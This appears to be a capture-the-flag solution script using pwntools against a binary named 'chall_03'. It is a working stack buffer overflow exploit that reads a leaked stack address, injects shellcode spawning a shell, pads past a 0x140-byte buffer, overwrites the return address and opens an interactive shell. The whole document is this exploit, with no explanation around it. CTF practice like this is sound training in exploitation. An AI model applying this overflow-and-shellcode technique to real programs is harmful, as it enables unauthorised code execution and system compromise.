# coding: utf-8
!checksec chall_03
ls
def chall03(file):
    p = process(file)
    print(p.recvuntil(":)"))
    context.arch = "amd64"
    a = asm(shellcraft.sh())
    len_a = len(a)
    leak = p.recv()
    intleak = int(leak,16)
    payload = ( a + b"a"*(0x140-len_a) + b"a"*8 + p64(intleak))
    p.sendline(payload)
    p.interactive()
    p.close()
    
chall03("chall_03")
